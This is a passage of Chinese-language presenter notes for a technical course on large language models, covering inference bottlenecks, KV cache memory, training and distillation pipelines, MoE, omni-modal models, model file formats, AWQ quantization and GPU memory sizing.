序列末尾，准备生成下一个词。这就引出了大模型推理最具争议的性能瓶颈：为什么 Prefill 和 Decode 的瓶颈完全不同？KV Cache 是如何拯救我们，又带来了什么显存诅咒？我们进入 P09。","page_9.html":"## Slide Objective\n深入剖析大模型推理的两阶段物理本质：Prefill 阶段的计算密集（Compute-bound）与 Decode 阶段的访存密集（Memory-bound）；厘清 KV Cache 空间换时间的数学机理，并推导 KV Cache 随并发与上下文长度爆炸的显存定量计算公式。\n\n## Suggested Presentation\n在企业落地大模型推理服务时，工程师经常遇到两个困惑：\n第一，为什么明明 GPU 算力利用率显示只有 20%，但服务却卡成 PPT，每秒只能吐出几个字？\n第二，为什么模型文件只有 14GB，但跑着跑着 80GB 的 A100 显存突然 OOM（内存溢出）崩掉了？\n搞懂这两个问题，就必须掌握 Prefill、Decode 与 KV Cache 的底层关系。\n\n请看上方卡片 1：Prefill 阶段（输入评估阶段）。\n当用户发送一段 2000 字的 Prompt 时，模型内部是一次性把这 2000 个 Token 并行灌进 GPU 的。此时做的是大矩阵乘大矩阵（GEMM），GPU 的 Tensor Core 能够以接近理论上限的效率满负荷运转。这个阶段只发生一次，决定了用户点击“发送”后需要等待多久才能看到第一个字，也就是首字延迟（TTFT）。\n\n请看上方卡片 2：Decode 阶段（逐字生成阶段）。\n第一个字生成后，系统进入自回归循环，每次只生成 1 个新词。此时模型做的是大矩阵乘以单向量（GEMV）。在每一个词生成的微秒级瞬间，GPU 必须把数十层网络数百亿参数的权重、以及历史上所有词的 KV 缓存，全部从 HBM 显存通过物理总线搬到流式多处理器（SM）中算一遍！算力核心瞬间算完后，又得傻傻等待下一次从显存里搬运数据。因此，Decode 阶段的算力利用率极低，系统性能完全被显存带宽死死卡住（Memory-bound），显存带宽多宽，每秒吐字速度（TPS）就有多快！\n\n为了避免每次生成一个新词都把前面几千个历史词从头算一遍（否则复杂度会达到 $O(N^2)$），我们使用了下方底部的 KV Cache（键值缓存）。\nKV Cache 将过去算好的 Key 和 Value 矩阵常驻在显存里，单步计算复杂度降到了 $O(1)$，实现了空间换时间。\n但大家请看这个显存公式：\n$\\text{VRAM}_{KV} = 2 \\times 2 \\times L \\times H_{kv} \\times d_{head} \\times \\text{Context\\_Len} \\times \\text{Batch\\_Size}$ 字节。\n第一个 2 代表 Key 和 Value 两个矩阵；第二个 2 代表 16 位浮点数占 2 字节。\n请注意：它是随着上下文长度（Context Length）和并发会话数（Batch Size）线性膨胀的！\n在推演案例中，一个标准的 70B 模型，当并发达到 16、上下文拉长到 32K 时，光是存放 KV Cache 就需要吃掉 67GB 显存，直接超过了 INT4 量化后的权重显存！如果不做系统级优化，长文本并发推理根本不可能上线。\n\n## Key Q&A / Clarifications\n**Q：在云厂商的 API 计费中，为什么输入 Token（Prompt）的价格通常比输出 Token（Completion）便宜很多？**\nA：这正是底层硬件物理特性的直接映射！Prefill 阶段（输入 Token）是高度并行的 GEMM 运算，GPU 算力利用率极高，计算成本低；而 Decode 阶段（输出 Token）是极度消耗显存带宽且计算单元大量空转的 GEMV 串行循环，耗费的 GPU 物理机时和带宽成本远高于输入阶段。\n\n## Transition\n第二章我们把推理计算单元从 Tokenizer、RoPE、GQA 到 KV Cache 彻底拆解完毕。那么，一个具备数十亿参数的神经网络，最初是如何被一步步“炼”出来的？让我们进入第三章 P10：2026 现代大模型四阶段训练流水线全景。","page_10.html":"## Slide Objective\n系统呈现 2026 年现代大模型训练与演进流水线全景图。纠偏“模型训练只有固定四阶段”的机械认知，全面升级引入“继续预训练（Continual Pre-training）”、“基于可验证奖励的强化学习（RLVR/GRPO）”以及“知识蒸馏（Distillation）与量化压缩闭环”，帮助架构师建立从千亿大模型研发到端侧与企业高效部署的端到端认知体系。\n\n## Suggested Presentation\n我们正式进入第三章！\n在很多科普文章和入门资料里，大家经常看到大模型的“四阶段训练流水线”：预训练、SFT、RLHF、最后来个对齐。\n但是作为技术架构师，如果你只有这种简化的线性认知，在企业进行模型选型、私有化改造时就会面临严重的盲区。\n\n今天我们把 2026 年最先进的**大模型完整演进闭环**彻底展开，它由四大核心支柱构成：\n- **第一支柱：预训练（Pre-training）与继续预训练（Continual Pre-training）**。\n  海量预训练吞噬了 10T 到 20T 的世界文本，构建了高维认知流形，决定了模型的“智商上限”。\n  但这里有一个关键工程分支——**继续预训练**：当 Base 模型开源后，金融机构想让它掌握近五年全部研报，或者互联网大厂想注入上百亿行企业自研代码库，我们不会从零训练，而是在 Base 权重基础上增量注入垂直语料。通过动态混合通用语料，在灌注新领域知识的同时防止“灾难性遗忘”；\n- **第二支柱：指令监督微调（SFT）**。\n  SFT 的核心不是灌输海量知识，而是**“规范行为与输出协议”**。通过数万条精雕细琢的高质量问答对，教模型理解角色设定，按照严格的 Markdown、JSON Schema 以及 Tool Calling 协议输出；\n- **第三支柱：偏好对齐与深度推理能力强化（RLHF/DPO + RLVR/GRPO）**。\n  这里在 2026 年发生了革命性分化：\n  一方面，主观对话通过轻量级的 DPO（直接偏好优化）去除偏激有害内容；\n  另一方面，在数学和编程等具备客观真理的领域，以 DeepSeek-R1、OpenAI o1 为代表的 **RLVR（可验证奖励强化学习）与 GRPO 算法**全面爆发！系统利用编译器报错、单元测试沙箱和数学公式验证器作为无私的裁判，让模型在数百万次试错中自发涌现出 `<think>` 长链慢思考与反思纠错能力；\n- **第四支柱：知识蒸馏（Distillation）与模型压缩，打通落地闭环**。\n  671B 的超大模型虽然极其聪明，但推理需要 8 张甚至 16 张顶规 GPU，推理延迟高、显存成本巨大，企业业务根本跑不起！\n  怎么破局？**模型蒸馏登场！** 将大模型产出的高质量长思维链数据反哺给 1.5B、7B、14B、32B 的中小模型进行蒸馏训练。小模型“站在巨人的肩膀上”，只保留了核心推理精华，单张消费级显卡就能毫秒级飞速推理！\n\n大家看底部的核心认知：\n**预训练决定上限，后训练唤醒对齐，而蒸馏让尖端推理能力普惠下沉。**\n理解了这个闭环，你就明白了为什么现在开源社区 7B/14B 小模型的推理能力能够媲美昔日的庞然大物。\n\n## Key Q&A / Clarifications\n**Q：企业自建模型时，有必要自己从头做预训练（Pre-training）吗？**\nA：绝大多数企业完全没必要、也不应该从头做预训练！从零预训练一个 70B 模型至少需要数百张 H100 显卡烧跑数周，花费数百万美元。企业的正确工程姿态是：选用经过充分预训练的高质量开源基座（如 Qwen2.5 / DeepSeek），基于企业私域语料做轻量级“继续预训练（Continual Pre-training）”或“SFT + RAG”，再结合蒸馏与量化技术，以极低成本达到生产可用标准。\n\n## Transition\n理解了训练演进的四大支柱之后，我们接下来深入前两个关键阶段：万亿 Token 的无监督预训练数据洗矿厂，与决定模型指令遵循能力的 SFT 数据工程。请看第 11 页。\n","page_11.html":"## Slide Objective\n拆解现代模型训练前两阶段的核心工程：无监督预训练数据清洗、继续预训练（Continual Pre-training）防遗忘工程，以及 SFT 指令对齐工程（LIMA 假说、Evol-Instruct 与 ChatML 规范）。让学员理解“数据工程如何决定模型能力上限”，并掌握在企业自建领域模型时继续预训练的关键策略。\n\n## Suggested Presentation\n上一页我们总览了完整的训练演进闭环，现在我们深入前两大支柱：\n第一支柱是**海量预训练与继续预训练**。\n在预训练阶段，大家经常听到“输入了 10 万亿 Token”。大家千万不要以为这些数据是直接从网上爬下来就喂给显卡的！\n如果把未经清洗的 Common Crawl 原始网页直接灌进去，模型学到的绝大部分都是广告弹窗、SEO 垃圾词和乱码，模型会直接练“废”。\n所以工业界有一套极其严密的**“四重洗矿过滤网”**：\n1. **启发式规则**：过滤掉大量乱码、停用词比例畸高或者 HTML 标签多于有效文本的垃圾；\n2. **全局模糊去重（MinHash / LSH）**：跨几十 TB 语料剔除被互联网反复抄袭、镜像转载的冗余网页，通常能直接砍掉 50% 以上的数据体积；\n3. **质量模型打分**：用小模型给文章的逻辑性、知识深度打分，淘汰无营养的口水话；\n4. **黄金配比融合**：高质量权威书籍、清洗后的代码库以及精心构造的合成数据按比例混合。\n\n**那么，企业什么时候需要做“继续预训练（Continual Pre-training）”？**\n比如你是某家大型银行或医疗机构，你想让大模型精通你们内部独特的金融交易指令、或者上千万份未公开的医学病例。这些知识公网完全没有，单靠几千条 SFT 问答对根本无法让模型形成扎实的底层语义流形。\n这时候，架构师就会启动**继续预训练**：\n在已有 Base 模型的基础上，喂入几百亿 Token 的领域语料。\n但这里必须防范一个致命陷阱——**灾难性遗忘（Catastrophic Forgetting）**！\n很多团队直接拿 100% 的医疗数据去训，结果模型医学变强了，但连最基础的算术、Python 语法和通用中文理解能力全部退化了！\n**工业级解法是“数据回放（Data Replay）”与精细退火**：在企业垂直数据中，强制混入 15% 到 20% 的通用高质量代码和常识语料，同时采用平缓的学习率退火策略，在注入新知识的同时死死守住基座模型的通用智力。\n\n第二支柱是**阶段二的 SFT（指令监督微调）**。\n很多工程师误以为 SFT 数据越多越好，动辄收集几十万条。\nMeta 在著名的 **LIMA 假说（Less is More for Alignment）** 中给出了震撼结论：\n用仅仅 1,000 条人工精雕细琢的高质量多样化问答，训练出的模型指令遵循能力，直接吊打了用 50,000 条网搜平庸问答训练的模型！\nSFT 的核心是教模型**“怎么听话、怎么按规矩输出”**。在工程落地中，我们普遍采用底部展示的 **ChatML 规范（`<|im_start|>` / `<|im_end|>`）**，并开启 **Loss Masking**——在计算反向传播时，系统只对 Assistant 吐出的回答计算梯度 Loss，而把 System Prompt 和 User 提问部分的梯度完全屏蔽（Mask 掉），不让模型浪费算力去死记用户的提问。\n\n## Key Q&A / Clarifications\n**Q：在继续预训练中，为什么必须混入 15%~20% 的通用旧数据？**\nA：因为神经网络的参数是全连接交织的。如果全部更新样本都来自同一个单一领域，梯度反向传播会持续冲刷覆盖掉原先用于表示常识逻辑、数理推理的高维流形超平面，导致旧能力迅速崩溃（灾难性遗忘）。混入 15%~20% 通用多样性数据相当于设置了“记忆锚点”，强迫网络在调整局部领域表征的同时维持原有的全局特征分割面。\n\n## Transition\n有了 Base 模型的渊博知识，以及 SFT 赋予的听从指令能力，模型已经能够流畅对话。但它面对复杂数理逻辑时依然容易胡猜，面对有害诱导时可能顺从作恶。如何让模型实现价值观对齐，并在客观数理世界中自主进化出慢思考与自省纠错能力？下一页，我们来看阶段三与阶段四。\n","page_12.html":"## Slide Objective\n深入解析现代大模型训练的高阶阶段：DPO 人类偏好对齐原理、RLVR/GRPO 可验证奖励驱动的慢思考自涌现机制，以及将“模型知识蒸馏（Distillation）与量化压缩”纳入模型演进闭环的工程意义。让学员深刻理解 2026 年以 DeepSeek-R1、OpenAI o1 为代表的深度推理革命，以及中小模型如何通过蒸馏实现生产级以小博大。\n\n## Suggested Presentation\n上一页我们讲了 Base 模型与 SFT。\n如果只做到 SFT，模型其实只是一个“善于模仿人类对话格式的复读机”。当遇到深奥的数学证明、多步骤跨模块代码重构或者刁钻算法题时，它依然会因为急于生成第一个词而出现严重的逻辑胡言乱语。\n在 2026 年，整个 AI 界的王炸突破，正是发生在我们眼前这一页：**强化学习推理突破与知识蒸馏闭环！**\n\n我们看左边的**阶段三 · 主观对齐（DPO）**：\n以前做 RLHF，必须用 PPO 算法，要在显存里同时挂 4 个模型（Actor 策略模型、Critic 价值模型、Reward 奖励模型、Reference 基准模型），训练极其脆弱，学习率稍微设不对就梯度爆炸。\n而 **DPO（直接偏好优化）** 在数学上证明：隐式奖励函数可以直接用策略模型自己的概率对数比来表达！\n这把强化学习对齐变成了类似分类任务的稳定闭式训练，极大地降低了工业对齐的门槛。\n\n我们看中间的**阶段四 · 客观推理强化（RLVR / GRPO）**：\n为什么强化学习突破偏偏最先发生在“写代码与做数学”，而不是写散文或做哲学？\n因为写散文由人类打分，模型极容易搞“奖励黑客（Reward Hacking）”——写一堆看起来很高大上但毫无逻辑的华丽辞藻来骗取人类高分；\n但在编程和数理逻辑中，**编译器（Compiler）和自动化单测套件是客观无私的“真理发生器（Ground Truth Verifier）”！**\n代码编译通不过？直接 0 分！单测有 1 个红灯？0 分！全部通过？给 +1 分！\n以 **GRPO（组相对策略优化）** 为代表的前沿算法，彻底抛弃了臃肿的 Critic 评判模型，模型在同一个输入下生成多个候选解答，依靠真理沙箱自动打分，组内相互对比进行策略更新。\n为了拿到那唯一的真理奖励，大模型在数百万次自博弈试错中，**自发涌现出了 `<think>` 思维链！** 它学会了先提出假设、自我验算，发现走入死胡同立刻反思“wait, that's wrong, let me reconsider”，然后回溯换方向！这标志着大模型从“直觉快思考（System 1）”跨越到了“严谨慢思考（System 2）”！\n\n但是，作为企业架构师，你马上会遇到一个现实问题：\n像 DeepSeek-R1 这种 671B 拥有完整慢思考能力的模型，部署需要两台 8 卡顶规服务器（如 16 张 H800/H20），并发一高服务器立刻冒烟，中小企业根本承受不起！\n这时候，**右边的阶段四闭环——知识蒸馏（Distillation）带来了商业奇迹！**\n开源团队将 671B 巨型教师模型在数万道难题中摸索出的 80 万条高质量 `<think>` 长链思考过程作为训练语料，通过软标签与思维链蒸馏，训练 1.5B、7B、14B、32B 的中小模型。\n结果惊艳了全世界：经过 R1 蒸馏的 14B 和 32B 小模型，在数理与编程测试集上的准确率，竟然逼近了千亿原版模型！\n而一个 14B 或 32B 的模型，只需要一张单卡 RTX 4090 或单台廉价服务器就能飞速运行！\n\n这就是 2026 年模型工业落地的真正飞轮：\n**用千亿大模型通过 RLVR/GRPO 探索推理极限，再用知识蒸馏把智力灌注进小模型，让企业在极低成本下享受顶级 AI 生产力！**\n\n## Key Q&A / Clarifications\n**Q：蒸馏（Distillation）和直接微调（Fine-tuning）有什么本质区别？**\nA：普通微调通常是“硬标签（Hard-label）学习”，只要求模型对标准答案进行交叉熵匹配（Ground Truth = 1，其他 = 0）；而知识蒸馏是“软标签与思维过程学习”，学生模型不仅学习教师模型最终给出的答案，更学习教师模型输出概率分布的平滑度（暗含不同错误选项的关联度与置信度），特别是学习教师模型自省反思的 `<think>` 认知轨迹。因此，蒸馏能将教师模型的深层逻辑思维与反省能力高效迁移给参数量远小于它的小模型。\n\n## Transition\n理解了训练、对齐、推理强化与蒸馏的完整流水线后，我们接着要面对模型产出的实体文件：从开源社区下载的数十 GB 模型到底是什么格式？为什么会有 Safetensors、GGUF，量化算法 AWQ 又是什么？下一页，我们彻底解耦这些混淆概念。\n","page_13.html":"## Slide Objective\n深入剖析大模型从 Dense（稠密模型）向 MoE（混合专家稀疏路由模型）的架构演进；解释门控路由器（Router）的 Top-K 动态激活机制；通过典型开源模型对比“总参数量”与“激活参数量”的经济学差异，并客观指出 MoE 私有化部署时的显存与跨卡通信挑战。\n\n## Suggested Presentation\n在 2024–2026 年，大家会发现一个极其违反直觉的现象：DeepSeek-V3 拥有高达 6710 亿的超大参数量，但它的调用 API 价格却比很多 70B 稠密模型还要便宜好几倍，吐字速度还飞快！为什么参数量越大，推理反倒能更便宜、更快？答案就在于架构层面的彻底革命——从 Dense 迈向 MoE。\n\n请看左侧卡片：经典的 Dense（稠密架构）。\n在传统 Dense 模型中，不管用户输入的是一句“你好”还是一个极其复杂的量子力学方程，前向传播时模型 100% 的神经元权重都必须全量启动参与计算。当模型扩大到 70B 甚至 405B 时，每生成一个 Token 需要消耗的浮点运算量（FLOPs）呈线性飙升，这在经济上是不可持续的。\n\n请看右侧卡片：MoE（混合专家架构）。\nMoE 的核心思想是“分工协作”。它把每一层原本巨大无比的 FFN 前馈网络，切分成几十个甚至上百个小型的独立网络，称之为“专家（Experts）”。\n在这些专家门前，放着一个门控路由器（Router）。当一个 Token 流经时，Router 会在几微秒内计算出各个专家的匹配得分，然后只挑选得分最高的 $K$ 个专家（比如 8 个专家中的前 2 个，或者 256 个专家中的前 8 个）去计算这个 Token，其余 90% 以上的专家全部处于睡眠状态！\n\n大家看底部的对照表：\nMixtral 8x7B 虽然总参数有 47B，但每个 Token 实际上只激活 13B 参数的算力；\n而 DeepSeek-V3 更为极致：总参数高达 671B，但因为采用了细粒度专家切分（256 个路由专家选 8 个 + 1 个常开的共享专家），每个 Token 在运行时只激活区区 37B 参数！这就是它为什么能以 37B 的极快推理成本，换取 671B 顶级智力记忆容量的根本机理。\n\n但是，架构师必须清醒地看到 MoE 带来的工程挑战：\nMoE 降低的是“计算 FLOPs”，但并没有降低“权重显存占用”！\n虽然每个 Token 只激活 37B，但 671B 的全部专家权重必须同时常驻在集群的 GPU 显存里，随时等待 Router 调度！此外，不同专家分布在不同的显卡上，Token 在专家之间流转需要通过机间网络进行密集的 All-to-All 分布式通信。如果你的机房没有 InfiniBand 高速 RDMA 互联，MoE 模型的吞吐就会被网络通信死死卡死。\n\n## Key Q&A / Clarifications\n**Q：企业做本地私有化部署时，应该优先选 Dense 模型还是 MoE 模型？**\nA：取决于你的硬件卡槽资源与并发要求。如果你的机房只有 1~2 张高端消费级显卡（如双卡 RTX 4090），受限于显存总量，应该优先选择小尺寸 Dense 模型（如 Qwen-2.5-14B/32B）；只有当你的集群拥有 8 卡 A100/H800 等充沛的显存容量、且需要承载高并发业务时，部署 MoE 才能发挥出其单 Token 计算低成本、高并发吞吐的压倒性优势。\n\n## Transition\n文本领域的架构已经演进得极为成熟，但真实世界不仅有文字，还有图像、高频音频与流媒体。大模型是如何从外挂识别走向原生全模态的？我们进入 P14：跨模态演进 Native Omni 原生全模态融合。","page_14.html":"## Slide Objective\n深入剖析多模态大模型的底层架构演进路线：从传统依赖独立视觉/语音模型拼接的“三段式外挂管道（Late Fusion）”，迈向 2026 年统一 Token 空间与单一 Transformer 骨干网络的“原生全模态（Native Omni Early Fusion）”，阐释延迟从数秒骤降至 200ms 的技术密码。\n\n## Suggested Presentation\n过去我们在手机或车载系统上体验“语音助手”，大家普遍觉得很笨拙——你必须按住说话，等个两三秒，它才能机械地读出一段文字。很多人以为这是 4G/5G 网络信号差，其实这是底层架构的先天缺陷造成的。\n\n请看左侧卡片：传统跨模态的“三段式外挂拼装管道”。\n在 GPT-4o 问世之前，业界的所谓“多模态”其实是把三个独立的模型像搭积木一样生硬串在一起：\n第一步，先启动一个语音识别模型（如 Whisper），把人类的声波强制翻译成文字；\n第二步，把文字灌给纯文本大模型（LLM），生成一段回答文本；\n第三步，把回答文本喂给语音合成模型（TTS），机械地念出声音。\n大家算一算这个工程账：三个独立模型串行，每一次输入输出都涉及显存加载和网络序列化，端到端延迟轻松超过 3 秒！更严重的是信息熵的不可逆损耗：你在电话里是哭着说的、笑着说的、还是带着急促的喘息声，在第一步被 ASR 抹成冰冷的纯文本字符时，所有副语言情绪全部丢光了！\n\n再看右侧卡片：2026 原生全模态（Native Omni）架构。\n以 GPT-4o 为分水岭，行业彻底抛弃了三段式流水线，进入了“Early Fusion（早期原生融合）”时代：\n首先，通过神经音频编解码器（如 EnCodec 或 Mimi），把连续的音频声波直接切分成一秒包含几十个单元的音频 Token；把图像切成一个个视觉 Patch Token；\n接着，这三种不同模态的 Token 被直接投影到同一个空间，全部喂给唯一的一个巨型 Transformer 骨干网络！\n模型在内部注意力计算时，左耳听着音频 Token，眼睛看着图像 Token，大脑同时生成文字和音频 Token。\n正如底部对比所展现的：\n1. 延迟从 3000ms 狂降至 200~300ms，直接达到了人类面对面交流的生理神经反应极限；\n2. 模型具备了真正的“情绪共鸣”，能直接从声波中感知你的焦虑与笑意，甚至可以用耳语轻声安慰你；\n3. 原生支持真正的全双工打断（Barge-in）：用户随时插话，模型瞬间感知音频流冲突，立即平滑终止当前吐字并接住新话题，彻底告别“对讲机式”的尴尬交互。\n\n## Key Q&A / Clarifications\n**Q：原生全模态架构在企业私有化部署时，对硬件有什么特殊要求？**\nA：原生全模态对流式计算的吞吐与延迟极其严苛。因为音频流是高频持续输入的（每秒几十个 Token），如果推理引擎不支持动态前缀缓存（Prefix Caching）与极低延迟的流式 Chunk Prefill，GPU 很快会被高频打断请求阻塞。因此生产落地通常需要配置支持多模态输入加速的专用推理容器（如配备专用流式音频驱动的 vLLM 或 TensorRT-LLM）。\n\n## Transition\n第三章我们把大模型“怎么炼成的、内部怎么分工、怎么跨模态”彻底拆解完毕。接下来，我们将正式踏入第四章：走出理论，下沉到物理机房与显存底座。首先来到 P15：扒开模型权重，深入解析 Safetensors 与 GGUF 格式。","page_15.html":"## Slide Objective\n从系统工程体系的高度，彻底解耦技术圈中经常被混为一谈的四大概念：权重序列化格式（Safetensors）、推理生态格式（GGUF）、量化算法（AWQ）与量化精度位宽（INT4/INT8）。重点剖析 Safetensors 与 GGUF 的底层设计哲学与适用场景差异，树立清晰的模型文件心智模型。\n\n## Suggested Presentation\n我们进入第四章！\n在企业进行模型私有化部署时，很多工程师从 HuggingFace 或 ModelScope 上下载模型，经常会看到各种各样的名词：Safetensors、PyTorch bin、GGUF、AWQ、GPTQ、INT4、BF16……\n很多甚至工作两三年的同学，嘴里经常蹦出一句话：“我们用 GGUF 算法给模型做了量化。”\n作为高级架构师，你一听就应该知道：这句话在技术概念上是完全不及格的“病句”！\n\n今天，我们用屏幕上方的**“四大正交解耦维度”**，彻底把这些概念理得清清楚楚：\n1. **维度 1：安全的 Tensor 序列化存储格式（Serialization Format）**。它解决的是“张量数据如何在硬盘上以纯数据二进制安全存储、杜绝代码注入风险并实现零拷贝加载”。代表是 **Safetensors** 和传统的 PyTorch `.bin`；\n2. **维度 2：面向端侧推理生态的模型文件格式（Model File Format）与计算库**。它解决的是“怎么把模型结构超参、分词词表和多精度权重自包含打包，并跨平台执行”。代表是 **GGUF** 模型文件格式与底层纯 C/C++ 张量计算库 **GGML**（由 llama.cpp / Ollama 驱动）；\n3. **维度 3：量化优化算法（Quantization Algorithm）**。它解决的是“从 16 位浮点压缩到 4 位整数时，用什么数学手段保护关键通道、把精度损失降到最低”。代表是 **AWQ、GPTQ、SmoothQuant**；\n4. **维度 4：目标量化精度与位宽（Precision / Bit-width）**。它度量的是“每个参数物理上到底占几个 bit”。比如 **BF16（16 bit）、INT8（8 bit）、INT4（4 bit）**。\n\n理清了这四个维度，我们再看今天最核心的两大文件格式对比：\n**左边是云端和服务器集群的统治者：Safetensors（安全的 Tensor 序列化格式）**。\n为什么现在整个业界都彻底废弃了传统的 PyTorch `.bin` 文件？\n因为旧的 `.bin` 底层基于 Python 的 `pickle` 序列化机制，黑客可以在模型文件里植入恶意 Shell 脚本，你一执行 `torch.load()`，服务器直接被种下后门木马，安全风险巨大！\nHuggingFace 发明的 **Safetensors**，头部是一段纯数据的 JSON 元数据（记录张量名称、形状和偏移量），后面全是纯粹的原始二进制张量。它**完全杜绝代码执行风险**，而且完美支持现代 OS 的 **mmap 内存映射与零拷贝（Zero-copy）**——多张 GPU 显卡可以直接通过内存映射把权重分段捞进显存，是云端 vLLM、TensorRT-LLM、SGLang 等高并发推理集群的绝对标配！\n\n**右边是端侧设备与单机本地推理的标准：GGUF 模型文件格式 + GGML 计算库**。\n在端侧个人电脑、Mac 甚至工控机上跑模型，如果还像云端一样散落着 `config.json`、`tokenizer.json`、几百个分片 `.safetensors`，普通环境根本难以管理。\nllama.cpp 生态发明了 **GGUF**：它把模型超参数、分词器（Tokenizer 词表）以及量化张量**全部自包含封装进唯一一个 `.gguf` 文件**！配合底层可移植的 **GGML 张量计算库** 与操作系统 **mmap** 映射，极速启动。\n更厉害的是，GGUF 专门为“显存有限”的设备设计：它支持 **CPU 和 GPU 混合分层卸载（Layer Offloading）**。如果你的显卡只有 8GB 显存，装不下 14GB 的模型，它允许你把前 20 层卸载给 GPU，后 12 层放在 CPU 内存跑，慢一点但绝不 OOM！\n\n请大家牢记底部的架构避坑指南：\n**GGUF 是生态容器格式，AWQ 是量化算法，INT4 是位宽！**\n在汇报方案时，准确说出“我们将 Safetensors 权重通过 AWQ 算法量化为 INT4 精度，并打包为 GGUF 格式供端侧运行”，才是专业架构师的语言标准。\n\n## Key Q&A / Clarifications\n**Q：在企业 Kubernetes 集群用 vLLM 部署私有化大模型，应该选 Safetensors 还是 GGUF？**\nA：首选 Safetensors！因为企业级 GPU 服务器通常显存充沛（如 A100/H800/4090），vLLM、TensorRT-LLM 专为 Safetensors 设计了多卡张量并行（Tensor Parallelism）极速加载流水线；而 GGUF 主要针对 CPU/GPU 混合环境和单机轻量化环境（如 llama.cpp/Ollama），在万卡云端高并发分布式推理中的吞吐量不如成熟的 Safetensors 体系。\n\n## Transition\n理解了文件的存储与打包格式后，我们接着要攻克量化的深水区：把 16 位的浮点数压缩成 4 位整数，数学上到底是怎么映射的？AWQ 又是凭什么做到只牺牲 1% 精度却节省 70% 显存的？请看第 16 页。\n","page_16.html":"## Slide Objective\n拆解量化体系中的两大核心维度：量化精度位宽（BF16/INT8/INT4）与量化优化算法（AWQ/GPTQ/RTN）。解析线性量化与动态反量化的数学机制，阐述 AWQ（激活感知权重量化）如何通过保护 1% 关键通道实现 INT4 精度几乎无损，帮助学员掌握企业级量化选型的技术决策依据。\n\n## Suggested Presentation\n上一页我们把文件格式（Safetensors vs GGUF）拆解清楚了。\n现在我们聚焦在量化本身的底层机理：**量化位宽（Bit-width）与量化算法（Algorithm）**。\n\n首先，我们看**维度 4：量化位宽（Bit-width）**：\n一个大模型有 700 亿个参数（70B）。\n如果在预训练基准精度 **BF16** 下，每个参数占用 2 个字节（16 个 bit），光是静态权重就要吃掉整整 $70 \\times 2 = 140\\text{ GB}$ 显存！至少需要两张 80GB 的顶规 A100 显卡才能把它装下。\n但如果我们把每个参数压缩到 **INT4**（每个参数只占 4 个 bit，也就是半个字节），70B 模型的静态权重体积直接暴降到 35GB！一张单卡 48GB 的专业显卡（如 RTX 6000 Ada 或双卡 4090）就能轻松吃下！\n显存直接节省了将近 **75%**！\n\n那么问题来了：\n一个原本在 $[-\\infty, +\\infty]$ 连续空间浮动的 16 位浮点数，现在只给你 4 个 bit（只能表示 0 到 15 这 16 个离散整数），这不是把信息全丢光了吗？为什么大模型不会直接变成白痴？\n这里包含两个维度的答案：\n**第一，是右上角的线性映射与反量化机理**：\n我们并不是在低精度下做矩阵乘法。在推理时，当权重从显存搬运进 GPU 张量核心后，计算单元通过公式 $\\hat{x} = \\text{Scale} \\times (q - \\text{Zero\\_point})$，以极快速度将 INT4 **动态反量化还原为浮点数**再进行乘加运算！\n量化真正解决的，不是计算单元的速度，而是我们上一页讲的**显存容量瓶颈与 HBM 访存总线带宽瓶颈**！把几十 GB 缩减到十几 GB，显存搬运时间直接打折，首字延迟与吞吐量全面暴涨！\n\n**第二，是下半部分的量化算法演进（AWQ 的神来之笔）**：\n如果你用最朴素的 **RTN 算法（Round-to-Nearest）**，也就是机械四舍五入，每个权重都随便舍入一下，误差在几十层网络中级联放大，INT4 模型的测试困惑度（Perplexity）直接爆表崩溃，根本不能用。\n后来演进出了 **GPTQ**，利用泰勒展开的二阶海森矩阵做误差补偿，精度提升显著。\n而 2024~2026 年成为工业级统治标配的，是 **AWQ（Activation-aware Weight Quantization，激活感知权重量化）**！\nMIT 团队做了一个极其震撼的发现：\n大模型中并不是所有权重都同等重要！在数以亿计的权重通道中，**只有极少数（大约 1%）的通道显著放大了输出激活值**。这 1% 的显著通道是大模型维持通用推理、代码语法和逻辑常识的“命根子”！\nAWQ 算法做了一件极其聪明的事：通过前向观测激活分布，识别出这最关键的 1% 显著权重并给予专门保护（保留较高精度缩放比例），而对其余 99% 的非关键权重进行激进的 INT4 压缩！\n结果令人惊叹：**模型显存体积缩减了 70%，而核心任务测试基准上的精度折损仅仅只有 1% 到 2%！**\n\n这就是现代量化黑科技的真面目：\n**通过 AWQ 算法，把模型权重压缩为 INT4 位宽，让曾经只有百万级服务器集群才能跑的千亿大模型，飞入寻常企业的单卡服务器！**\n\n## Key Q&A / Clarifications\n**Q：既然 INT4 节省 75% 显存，为什么企业不全量无脑推 INT4，还要保留 INT8 或 BF16？**\nA：这是一个典型的“任务敏感度权衡”：对于常规的自然语言对话、文本翻译、摘要总结与客服问答，AWQ INT4 几乎毫无感知区别；但在极度脆弱的长长链数理逻辑推导、超复杂跨文件代码重构、或特定专业领域的精细打分中，低位宽量化依然可能导致边缘长尾案例的注意力轻微漂移。因此，对高精严苛业务，很多企业会选择折中的 INT8，在节省 50% 显存的同时换取近乎 100% 的无损精度。\n\n## Transition\n掌握了文件格式与量化位宽后，作为架构师，你最关心的实际问题来了：我的业务有 20 个并发、要求单次对话 16K 上下文，我到底该向公司申请采购几张显卡？下一页，我们来看企业私有化部署显存精准速算的黄金公式！\n","page_17.html":"## Slide Objective\n向学员传授企业私有化部署大模型时显存容量测算的工程级黄金公式。纠偏仅计算“静态权重 + 理论 KV Cache”的实验室理想化算法，系统引入 CUDA Runtime 工作区、显存分配器物理碎片、推理框架缓存及多卡通信开销等实际工程修正项，并基于 7B 到 72B 主流规模给出严谨的硬件选型矩阵。\n\n## Suggested Presentation\n上一页我们讲了量化压缩能把模型体积砍掉 70%。\n很多年轻工程师学会了公式，兴冲冲地跑去给领导写预算申请：“领导，7B 的 INT4 权重才 3.5GB，我们买张 8GB 的显卡就能跑了！”\n结果显卡一买回来，服务刚拉起来就直接爆出 `CUDA out of memory` 崩溃！\n为什么？因为**实验室的理论计算和企业真实的工程部署之间，隔着一条巨大的鸿沟！**\n\n今天我们要把这套**“工业级显存速算工程模型”**彻底讲透！\n真实线上环境的总显存需求，绝不能只算静态权重，它由五大物理分量加一个核心膨胀系数构成：\n公式写在顶部：\n$\\text{VRAM}_{\\text{total}} = (M_{\\text{weights}} + M_{\\text{kv}} + M_{\\text{activations}} + M_{\\text{cuda}} + M_{\\text{comm}}) \\times (1 + \\text{Fragmentation})$\n\n我们逐个拆解这五个分量和工程修正项：\n1. **第一分量：静态模型权重（$M_{\\text{weights}}$）**。\n   BF16 下每 10 亿参数（1B）需要约 2GB 显存；而在 INT4 下，加上 Scale 缩放因子和量化元数据，每 1B 参数大约需要 0.55GB~0.6GB；\n2. **第二分量：动态 KV Cache（$M_{\\text{kv}}$）**。\n   